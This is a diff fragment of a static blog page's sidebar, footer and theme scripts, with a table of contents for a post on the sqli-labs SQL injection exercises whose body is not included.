+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/1ntro/image/master/avatar.jpg" alt="Intro">
+            
+              <p class="site-author-name" itemprop="name">Intro</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://paper.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/CHYbeta/Web-Security-Learning" title="Web安全资源" target="_blank">Web安全资源</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/skill/2" title="Web安全工程师" target="_blank">Web安全工程师</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLI和sqli-labs"><span class="nav-number">1.</span> <span class="nav-text">SQLI和sqli-labs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1-基于错误"><span class="nav-number">2.</span> <span class="nav-text">Less-1 基于错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2-基于错误"><span class="nav-number">3.</span> <span class="nav-text">Less-2 基于错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3-基于错误"><span class="nav-number">4.</span> <span class="nav-text">Less-3 基于错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4-基于错误"><span class="nav-number">5.</span> <span class="nav-text">Less-4 基于错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-双查询注入"><span class="nav-number">6.</span> <span class="nav-text">Less-5 双查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#双查询注入"><span class="nav-number">6.1.</span> <span class="nav-text">双查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#回到题目"><span class="nav-number">6.2.</span> <span class="nav-text">回到题目</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-双查询注入"><span class="nav-number">7.</span> <span class="nav-text">Less-6 双查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-7-通过outfile下载数据库"><span class="nav-number">8.</span> <span class="nav-text">Less-7  通过outfile下载数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#导入导出基础知识"><span class="nav-number">8.1.</span> <span class="nav-text">导入导出基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#load-file-导出文件"><span class="nav-number">8.1.1.</span> <span class="nav-text">load_file()导出文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#select…into-outfile"><span class="nav-number">8.1.2.</span> <span class="nav-text">select…into outfile</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目思路"><span class="nav-number">8.2.</span> <span class="nav-text">题目思路</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Intro</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("02/08/2018 19:14:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
